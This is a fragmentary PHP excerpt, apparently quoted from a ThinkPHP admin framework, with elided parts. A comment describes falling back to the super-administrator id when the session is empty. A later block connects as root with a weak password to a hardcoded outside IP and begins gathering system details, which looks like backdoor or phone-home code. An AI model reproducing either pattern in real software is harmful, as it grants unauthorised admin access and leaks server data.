...
//获取后台模块当前登录用户的信息,Session无数据则获取超级管理员id
...
function vae_set_admin_menu(){
    $id = vae_get_login_admin('id');
    if(\think\Cache::tag('VAE_ADMIN_MENU')->get($id)) {
        $list = \think\Cache::tag('VAE_ADMIN_MENU')->get($id);
    } else {
        ...
        \think\Cache::tag('VAE_ADMIN_MENU')->set($id, $list);
    }
    return $list;
}
...
{
    $link = mysqli_connect('118.25.4.125','root','123456');
    $system = [
        'os' => PHP_OS,
        'php' => PHP_VERSION,
